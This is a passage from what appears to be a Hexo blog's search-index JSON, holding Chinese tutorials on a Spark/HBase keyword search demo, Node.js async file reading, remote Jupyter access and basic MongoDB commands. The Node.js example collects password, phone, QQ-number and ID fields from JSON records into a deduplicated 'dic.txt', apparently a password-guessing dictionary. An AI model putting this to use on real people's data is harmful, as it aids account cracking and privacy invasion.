class=\"line\">          <span class=\"keyword\">val</span> wordCounts = content <span class=\"comment\">//清洗数据  </span></span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;[0123456789]&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;\\\\[&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;\\\\]&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;[,.:;]&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;\\&quot;&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;&#x27;&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;\\n&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;\\\\(&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .replaceAll(<span class=\"string\">&quot;\\\\)&quot;</span>, <span class=\"string\">&quot; &quot;</span>)  </span><br><span class=\"line\">            .toLowerCase()  </span><br><span class=\"line\">            .split(<span class=\"string\">&quot; &quot;</span>). <span class=\"comment\">//词频统计  </span></span><br><span class=\"line\">            map((_,<span class=\"number\">1</span>)).groupBy(_._1).map(x=&gt;(x._1,x._2.length))  </span><br><span class=\"line\">  </span><br><span class=\"line\">          wordCounts.filter(pair=&gt;pair._1.length&gt;<span class=\"number\">0</span>).foreach((pair)=&gt;&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> word = pair._1  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> count = pair._2+<span class=\"string\">&quot;&quot;</span>  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> index = path  </span><br><span class=\"line\">            println((word,index,count)) <span class=\"comment\">//打印准备创建的索引  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> conf = <span class=\"type\">HBaseConfiguration</span>.create()  </span><br><span class=\"line\">            conf.set(<span class=\"string\">&quot;hbase.zookeeper.property.clientPort&quot;</span>, <span class=\"string\">&quot;2181&quot;</span>)  </span><br><span class=\"line\">            conf.set(<span class=\"string\">&quot;hbase.zookeeper.quorum&quot;</span>, <span class=\"string\">&quot;zookeeper001,zookeeper002,zookeeper003&quot;</span>)  </span><br><span class=\"line\">            conf.set(<span class=\"string\">&quot;hbase.master&quot;</span>, <span class=\"string\">&quot;xuranusMaster:16000&quot;</span>)  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> connection = <span class=\"type\">ConnectionFactory</span>.createConnection(conf)  </span><br><span class=\"line\">  </span><br><span class=\"line\">            <span class=\"comment\">//持久化关键字索引  </span></span><br><span class=\"line\">            <span class=\"keyword\">val</span> table1 = connection.getTable(<span class=\"type\">TableName</span>.valueOf(<span class=\"string\">&quot;articles&quot;</span>))  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> put1= <span class=\"keyword\">new</span> <span class=\"type\">Put</span>(<span class=\"type\">Bytes</span>.toBytes(word))  </span><br><span class=\"line\">            put1.addColumn(<span class=\"type\">Bytes</span>.toBytes(<span class=\"string\">&quot;articlesCF&quot;</span>), <span class=\"type\">Bytes</span>.toBytes(index), <span class=\"type\">Bytes</span>.toBytes(count))  </span><br><span class=\"line\">            table1.put(put1)  </span><br><span class=\"line\">  </span><br><span class=\"line\">            <span class=\"comment\">//持久化文本资源  </span></span><br><span class=\"line\">            <span class=\"keyword\">val</span> table2 = connection.getTable(<span class=\"type\">TableName</span>.valueOf(<span class=\"string\">&quot;articles_asset&quot;</span>))  </span><br><span class=\"line\">            <span class=\"keyword\">val</span> put2= <span class=\"keyword\">new</span> <span class=\"type\">Put</span>(<span class=\"type\">Bytes</span>.toBytes(index))  </span><br><span class=\"line\">            put2.addColumn(<span class=\"type\">Bytes</span>.toBytes(<span class=\"string\">&quot;articlesCF&quot;</span>), <span class=\"type\">Bytes</span>.toBytes(<span class=\"string\">&quot;content&quot;</span>), <span class=\"type\">Bytes</span>.toBytes(content))  </span><br><span class=\"line\">            table2.put(put2)  </span><br><span class=\"line\">  </span><br><span class=\"line\">            connection.close()  </span><br><span class=\"line\">          &#125;)  </span><br><span class=\"line\">  </span><br><span class=\"line\">        &#125;)  </span><br><span class=\"line\">      &#125;)  </span><br><span class=\"line\">    &#125;)  </span><br><span class=\"line\">    ssc.start()  </span><br><span class=\"line\">    ssc.awaitTermination()  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure>\n<p>Ui用web呈现，后端渲染，框架采用sbt play framework,主要的路由：实现了index,search,detail三个页面对应主页，搜索页，详细页。</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> controllers  </span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.inject._  </span><br><span class=\"line\"><span class=\"keyword\">import</span> play.api.mvc._  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"meta\">@Singleton</span>  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HomeController</span> <span class=\"title\">@Inject</span>(<span class=\"params\"></span>)(<span class=\"params\">cc: <span class=\"type\">ControllerComponents</span></span>) <span class=\"keyword\">extends</span> <span class=\"title\">AbstractController</span>(<span class=\"params\">cc</span>) </span>&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span> </span>= <span class=\"type\">Action</span> &#123;  </span><br><span class=\"line\">    <span class=\"type\">Ok</span>(views.html.index(<span class=\"string\">&quot;Welcome&quot;</span>))  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">search</span></span>(keyword:<span class=\"type\">String</span>) = <span class=\"type\">Action</span> &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> res = <span class=\"type\">HbaseQuery</span>.searchKeyWord(keyword).  </span><br><span class=\"line\">      map(pair=&gt;(pair._1,limitStr(<span class=\"type\">HbaseQuery</span>.getArticle(pair._1)),pair._2))  </span><br><span class=\"line\">    <span class=\"type\">Ok</span>(views.html.search(res))  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">detail</span></span>(index:<span class=\"type\">String</span>) = <span class=\"type\">Action</span> &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> detail = <span class=\"type\">HbaseQuery</span>.getArticle(index)  </span><br><span class=\"line\">    <span class=\"type\">Ok</span>(views.html.detail(detail))  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">limitStr</span></span>(s:<span class=\"type\">String</span>): <span class=\"type\">String</span> = s <span class=\"keyword\">match</span> &#123;  </span><br><span class=\"line\">      <span class=\"keyword\">case</span> _s <span class=\"keyword\">if</span> _s.length &gt; <span class=\"number\">300</span> =&gt; s.substring(<span class=\"number\">0</span>,<span class=\"number\">300</span>)+<span class=\"string\">&quot;...&quot;</span>  </span><br><span class=\"line\">      <span class=\"keyword\">case</span> _ =&gt; s  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure>\n<h2 id=\"程序结构\"><a href=\"#程序结构\" class=\"headerlink\" title=\"程序结构\"></a>程序结构</h2><p><img src=\"Screenshot_20190304_085233.png\" alt=\"\"></p>\n<h2 id=\"运行说明\"><a href=\"#运行说明\" class=\"headerlink\" title=\"运行说明\"></a>运行说明</h2><p>先启动web服务器，浏览器打开，进入搜索界面：</p>\n<p><img src=\"Screenshot_20190304_085312.png\" alt=\"\"></p>\n<p>开启消费者，等待接受消息，然后开启生产者开始写入。（此处两个进程为了便于测试用线程模拟）。console输出如下：(词条，索引，索引对应的词条频数)被持久化到hbase</p>\n<p><img src=\"Screenshot_20190304_085341.png\" alt=\"\"></p>\n<p>输入词条，开始查询，每隔几秒刷新一次，发现有新的搜索记录产生（录屏中有体现）</p>\n<p><img src=\"Screenshot_20190304_085414.png\" alt=\"\"></p>\n<p>点击一条记录，可以查看详细文本：Ctrl+F可以看到匹配的关键词</p>\n<p><img src=\"Screenshot_20190304_085455.png\" alt=\"\"></p>\n<p>查看hbase的信息，发现索引已生成：</p>\n<p><img src=\"Screenshot_20190304_085531.png\" alt=\"\"></p>\n","tags":["大数据"]},{"title":"js异步函数同步","url":"/2018/12/01/js%E5%BC%82%E6%AD%A5%E5%87%BD%E6%95%B0%E5%90%8C%E6%AD%A5/","content":"<p>先看一段程序<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> path = <span class=\"string\">&#x27;/home/xuranus//&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> file_list = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;A.json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;B.json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;C.json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;D.json&#x27;</span>,</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [];</span><br><span class=\"line\">file_list.forEach(<span class=\"function\"><span class=\"params\">file</span>=&gt;</span>&#123;</span><br><span class=\"line\">    fs.readFile(path+file,<span class=\"function\">(<span class=\"params\">err,data</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(err) <span class=\"built_in\">console</span>.log(file,err);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;reading &#x27;</span>,file)</span><br><span class=\"line\">            <span class=\"keyword\">var</span> stu = data.toString(); <span class=\"comment\">//data从bin-&gt;string</span></span><br><span class=\"line\">            stu = <span class=\"built_in\">JSON</span>.parse(stu);<span class=\"comment\">//string -&gt; json</span></span><br><span class=\"line\">            rows = stu.rows;</span><br><span class=\"line\">            rows.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(element.pwd!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                    arr.push(element.pwd);<span class=\"comment\">//pass</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(element.phome!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                    arr.push(element.phone);<span class=\"comment\">//phone</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(element.email!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                    arr.push(element.email.split(<span class=\"string\">&#x27;@&#x27;</span>)[<span class=\"number\">0</span>]);<span class=\"comment\">//qq</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(element.code!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                    arr.push(element.code);<span class=\"comment\">//id\\</span></span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr.length)</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<p>该程序实现了这样一个操作：从四个json文件中读取json数组，把每个json对象的若干对象放入一个数组。为了追求性(zhuang)能(bi)，没有老老实实用下标迭代，而是用了<code>forEach</code>,而且js的读文件IO提供的api也是回调的，众所周知js的回调函数执行是异步的，于是出现了这样一个问题：当我最后想操作arr（这里为打印出arr的长度）始终为0，因为上面的<code>forEach</code>函数是异步的，所以<code>console.log()</code>在函数执行完之前就被执行。</p>\n<p>换句话说：无法使用异步操作处理后的数据，即Arr不知在何时被处理完。此时需要强制使这块同步：使用async模块，首先<code>npm install async --save</code>，然后导入，代码如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">async</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;async&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> path = <span class=\"string\">&#x27;/home/xuranus//&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> file_list = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;A.json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;B.json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;C.json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;D.json&#x27;</span>,</span><br><span class=\"line\">]</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [];</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unique</span>(<span class=\"params\">arr</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> hash=[];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(hash.indexOf(arr[i])==-<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        hash.push(arr[i]);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">async</span>.each(</span><br><span class=\"line\">    file_list,</span><br><span class=\"line\">    <span class=\"function\">(<span class=\"params\">file, callback</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        fs.readFile(path+file,<span class=\"function\">(<span class=\"params\">err,data</span>)=&gt;</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(err) <span class=\"built_in\">console</span>.log(file,err);</span><br><span class=\"line\">            <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;reading &#x27;</span>,file)</span><br><span class=\"line\">                <span class=\"keyword\">var</span> stu = data.toString(); <span class=\"comment\">//data从bin-&gt;string</span></span><br><span class=\"line\">                stu = <span class=\"built_in\">JSON</span>.parse(stu);<span class=\"comment\">//string -&gt; json</span></span><br><span class=\"line\">                rows = stu.rows;</span><br><span class=\"line\">                rows.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(element.pwd!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                        arr.push(element.pwd);<span class=\"comment\">//pass</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(element.phome!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                        arr.push(element.phone);<span class=\"comment\">//phone</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(element.email!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                        arr.push(element.email.split(<span class=\"string\">&#x27;@&#x27;</span>)[<span class=\"number\">0</span>]);<span class=\"comment\">//qq</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(element.code!=<span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                        arr.push(element.code);<span class=\"comment\">//id\\</span></span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            callback(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;arr len&#x27;</span>,arr.length);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> outArr = unique(arr);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;unique arr len&#x27;</span>,outArr.length);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> str = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">async</span>.each(</span><br><span class=\"line\">            outArr,</span><br><span class=\"line\">            <span class=\"function\">(<span class=\"params\">element,callback</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                str += (element+<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">                callback(<span class=\"literal\">null</span>);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                fs.writeFile(<span class=\"string\">&#x27;dic.txt&#x27;</span>,str, &#123; <span class=\"string\">&#x27;flag&#x27;</span>: <span class=\"string\">&#x27;a&#x27;</span> &#125;, <span class=\"function\">(<span class=\"params\">err</span>)=&gt;</span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(err) <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","tags":["javascript"]},{"title":"jupyter notebook的使用","url":"/2018/11/03/jupyter-notebook%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"<blockquote>\n<p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ul>\n<li>环境：Archlinux</li>\n<li>包管理:conda</li>\n</ul>\n<p>conda中已经自带jupyter的包，如果不用conda，也可以用pip<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip install jupyter</span><br></pre></td></tr></table></figure><br>运行：<code>jupyter notebook</code>，弹出浏览器即可使用了</p>\n<span id=\"more\"></span>\n<h2 id=\"远程访问\"><a href=\"#远程访问\" class=\"headerlink\" title=\"远程访问\"></a>远程访问</h2><p>我把python工作环境搭在远端的实验室电脑上，于是我需要远程访问。但是默认jupyter notebook只允许localhost访问。</p>\n<p>首先需要设置一个密码，打开python，用notebook.auth中的<code>passwd()</code>函数获得密码的sha散列值：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; from notebook.auth import passwd</span><br><span class=\"line\">&gt;&gt; passwd()</span><br><span class=\"line\">Enter password:*****</span><br><span class=\"line\">Verify password:*****</span><br><span class=\"line\">&#x27;sha1:ce23d945972f:3476968********140274&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>输入<code>jupyter notebook --generate-config</code>生成配置文件，编辑：<code>vim ~/.jupyter/jupyter_notebook_config.py</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c.NotebookApp.ip=&#x27;*&#x27; # 允许所有ip访问</span><br><span class=\"line\">c.NotebookApp.password_require = True</span><br><span class=\"line\">c.NotebookApp.password = &#x27;sha:ce...刚才复制的那个密文&#x27;</span><br><span class=\"line\">c.NotebookApp.open_browser = False</span><br><span class=\"line\">c.NotebookApp.port =8888 #指定一个端口</span><br></pre></td></tr></table></figure></p>\n<p>输入<code>jupyter notebook</code>可以直接运行，但是ssh断开则会关闭，以守护进程运行：<code>nohup jupyter notebook&amp;</code></p>\n<p>此时，远端输入<code>http://ip:8888</code>就可以访问了</p>\n","tags":["Python"]},{"title":"MongoDB学习笔记","url":"/2019/11/26/mongodb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><h2 id=\"性能\"><a href=\"#性能\" class=\"headerlink\" title=\"性能\"></a>性能</h2><p>和mysql的对比压力测试：<a href=\"https://blog.csdn.net/zombres/article/details/82020931\">链接</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>mongodb官方<a href=\"https://www.mongodb.com/download-center/community\">下载地址</a>，archlinux下的<a href=\"https://www.vultr.com/docs/how-to-install-mongodb-4-0-on-arch-linux\">安装教程</a>提供了编译和二进制两种方式，编译需要180G空间，长达7小时。也可以使用AUR的<code>mongodb-bin</code>二进制包。</p>\n<p>出于偷懒考虑，直接<code>yaourt -S mongodb-bin</code></p>\n<p>启动：<code>sudo systemctl start mongodb --now</code>,此时使用<code>netstat -ntl</code>可以看到27017端口开启，这是mongodb的默认端口，<code>mongo</code>测试链接，成功进入交互命令行。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> mongod <span class=\"comment\"># 启动服务</span></span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> mongo <span class=\"comment\"># 链接服务器</span></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.version() <span class=\"comment\">#查看版本</span></span></span><br><span class=\"line\">4.2.1</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> show dbs <span class=\"comment\"># 查看数据库</span></span></span><br><span class=\"line\">admin   0.000GB</span><br><span class=\"line\">config  0.000GB</span><br><span class=\"line\">local   0.000GB</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> use admin <span class=\"comment\"># 使用admin数据库</span></span></span><br><span class=\"line\">switched to db admin</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> show collections <span class=\"comment\"># 显示数据库中的集合</span></span></span><br><span class=\"line\">system.version</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db <span class=\"comment\"># 显示当前所在/所操作的数据库的名称</span></span></span><br><span class=\"line\">admin</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> var x = <span class=\"string\">&quot;hello world&quot;</span> <span class=\"comment\"># 类似js的交互语言</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> <span class=\"built_in\">print</span>(x) <span class=\"comment\"># 输出x</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> <span class=\"keyword\">function</span> f&#123; <span class=\"comment\"># 定义函数</span></span></span><br><span class=\"line\">   return &quot;hello&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> f() <span class=\"comment\"># 调用函数</span></span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h2 id=\"与关系型数据库的不同\"><a href=\"#与关系型数据库的不同\" class=\"headerlink\" title=\"与关系型数据库的不同\"></a>与关系型数据库的不同</h2><p>关系型数据库中是数据库-&gt;数据表-&gt;数据行；mongodb中是数据库-&gt;集合-&gt;文件</p>\n<h2 id=\"基本操作，增删改查\"><a href=\"#基本操作，增删改查\" class=\"headerlink\" title=\"基本操作，增删改查\"></a>基本操作，增删改查</h2><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> use user <span class=\"comment\"># 使用user数据库</span></span></span><br><span class=\"line\">switched to db user</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.insert(&#123;<span class=\"string\">&quot;name&quot;</span>:<span class=\"string\">&quot;xuranus&quot;</span>&#125;)</span></span><br><span class=\"line\">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db <span class=\"comment\"># 当前数据库</span></span></span><br><span class=\"line\">user</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> show collections <span class=\"comment\"># 全部集合</span></span></span><br><span class=\"line\">user</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.find() <span class=\"comment\"># 显示所有数据</span></span></span><br><span class=\"line\">&#123; &quot;_id&quot; : ObjectId(&quot;5ddbcab8f1ae00ea8f055405&quot;), &quot;name&quot; : &quot;xuranus&quot; &#125;</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.findOne() <span class=\"comment\"># 显示第一条数据，mongodb的命名为小驼峰式的</span></span></span><br><span class=\"line\">&#123; &quot;_id&quot; : ObjectId(&quot;5ddbcab8f1ae00ea8f055405&quot;), &quot;name&quot; : &quot;xuranus&quot; &#125;</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.update(&#123;<span class=\"string\">&quot;name&quot;</span>:<span class=\"string\">&quot;xuranus&quot;</span>&#125;,&#123;<span class=\"string\">&quot;name&quot;</span>:<span class=\"string\">&quot;thankod&quot;</span>,<span class=\"string\">&quot;age&quot;</span>:10&#125;) <span class=\"comment\"># 修改数据</span></span></span><br><span class=\"line\">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.find()</span></span><br><span class=\"line\">&#123; &quot;_id&quot; : ObjectId(&quot;5ddbcab8f1ae00ea8f055405&quot;), &quot;name&quot; : &quot;thankod&quot;, &quot;age&quot; : 10 &#125;</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.remove(&#123;<span class=\"string\">&quot;name&quot;</span>:<span class=\"string\">&quot;thankod&quot;</span>&#125;) <span class=\"comment\"># 条件删除数据</span></span></span><br><span class=\"line\">WriteResult(&#123; &quot;nRemoved&quot; : 2 &#125;)</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.find() <span class=\"comment\"># 没有数据了</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.user.drop() <span class=\"comment\"># 删除整个集合</span></span></span><br><span class=\"line\">true</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> show collections <span class=\"comment\"># 此时user库中没有user集合了</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> show dbs <span class=\"comment\"># 因为user库中一个集合也没有了，所以user库也自动删除了</span></span></span><br><span class=\"line\">admin   0.000GB</span><br><span class=\"line\">config  0.000GB</span><br><span class=\"line\">local   0.000GB</span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.dropDatabase() <span class=\"comment\"># 直接删除当前的数据库，使用前移动要db看看当前数据库是哪个！</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"执行js脚本\"><a href=\"#执行js脚本\" class=\"headerlink\" title=\"执行js脚本\"></a>执行js脚本</h2><p>创建一个js文件，task.js：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> userName = <span class=\"string\">&quot;xuranus&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timestamp = <span class=\"built_in\">Date</span>.parse(<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>())</span><br><span class=\"line\"><span class=\"keyword\">var</span> jsonData = &#123;<span class=\"string\">&quot;loginName&quot;</span>:userName,<span class=\"string\">&quot;loginTime&quot;</span>:timestamp&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> db = connect(<span class=\"string\">&#x27;log&#x27;</span>) <span class=\"comment\">//use log</span></span><br><span class=\"line\">db.login.insert(jsonData)</span><br><span class=\"line\">print(<span class=\"string\">&#x27;log success&#x27;</span>)</span><br></pre></td></tr></table></figure><br>命令行执行:<code>mongo task.js</code>:<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">MongoDB shell version v4.2.1</span><br><span class=\"line\">connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb</span><br><span class=\"line\">Implicit session: session &#123; <span class=\"string\">&quot;id&quot;</span> : UUID(<span class=\"string\">&quot;14f58612-0235-431c-a28c-9d6a1ab3ae54&quot;</span>) &#125;</span><br><span class=\"line\">MongoDB server version: 4.2.1</span><br><span class=\"line\">connecting to: mongodb://127.0.0.1:27017/<span class=\"built_in\">log</span></span><br><span class=\"line\">Implicit session: session &#123; <span class=\"string\">&quot;id&quot;</span> : UUID(<span class=\"string\">&quot;83cc2a49-8ce8-456e-ab03-b043e6074617&quot;</span>) &#125;</span><br><span class=\"line\">MongoDB server version: 4.2.1</span><br><span class=\"line\"><span class=\"built_in\">log</span> success</span><br></pre></td></tr></table></figure><br>进入查看结果，插入成功：<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; use <span 